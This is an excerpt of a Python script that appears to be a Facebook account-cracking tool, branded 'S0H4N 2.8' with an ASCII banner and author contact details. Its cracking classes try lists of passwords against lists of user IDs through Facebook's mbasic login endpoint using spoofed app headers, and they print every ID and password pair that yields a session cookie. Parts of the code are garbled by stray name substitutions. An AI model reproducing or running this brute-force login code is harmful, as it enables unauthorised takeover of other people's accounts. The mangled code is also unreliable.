...
r1=requests.get("https://github.com/AyeshaS0H4N/File1/blob/main/ApprovemXD.txt").text
...
header = {'x-fb-connection-bandwidth': repr(bd), 'x-fb-sim-hni': repr(sim), 'x-fb-net-hni': repr(sim),'x-fb-connection-quS0H4Nty': 'EXCELLENT', 'user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.3','x-fb-connection-type': 'unknown','content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
...
def main():
	...
	print("\033[1;92m\t│\033[1;92mWELLCOME TO S0H4N 2.8     \033[1;92m      │")
...
class __crack__:
	...
	def __mbasic__(self, user, _sempak_):
		...
		sys.stdout.write(f"\r \x1b[1;97m[\033[1;36mS0H4N\033[1;37m] {loop}/{len(self.id)} \033[1;37m[\033[1;36mTOTAL-Idz\033[1;37m] \033[1;37m[\033[1;36m{len(ok)}\033[1;37m]")
		...
		for pw in _sempak_:
			...
			po = ses.post("https://mbasic.facebook.com/login/device-based/vS0H4Ndate-password/?shbl=0", data = dataa, headers=_headers, allow_redirects = False)

			if 'c_user' in ses.cookies.get_dict():

				print('\r\033[1;37m[\033[1;32mS0H4N-OK\033[1;37m]\033[1;32m %s | %s      ' % (user,pw))
	...
	def __pler__(self):
		...
		if yan == '':
			...
			print('\033[1;37m[+]\033[1;36mS0H4N PROCESS HAS BEEN STARTED')
...
class __filecrack3__:
	...
	def __mbasic__(self, user, _sempak_):
		...
		sys.stdout.write(f"\r \x1b[1;97m[\033[1;36mS0H4N\033[1;37m] {loop}/{len(self.id)} \033[1;37m[\033[1;32mOK-{len(ok)}\033[1;37m] ")
...
\$$$$$$  | $$$$$$  |$$ |  $$ |$$ |  $$ |$$ | \$$ |        \$$$$$$  |$$ |  $$ |$$$$$$$$\ $$$$$$\ 
 ...
 \______/  \______/ \__|  \__|\__|  \__|\__|  \__|         \______/ \__|  \__|\________|\______|                                                                          

=================================================

    [-] AUTHOR    :\033[1;32m S0H4N

    [-] GITHUB    :\033[1;32m Devil-S1X4N

    [-] WhatsApp  :\033[1;32m 01301141056
...
def xoshnaw():
	...
	try:
		...
		if id in httpCaht:
			...
			os.system('xdg-open https://https://ww w.facebook.com/ITZ.XAYIN.XHOWDHURY.BED.PERSON
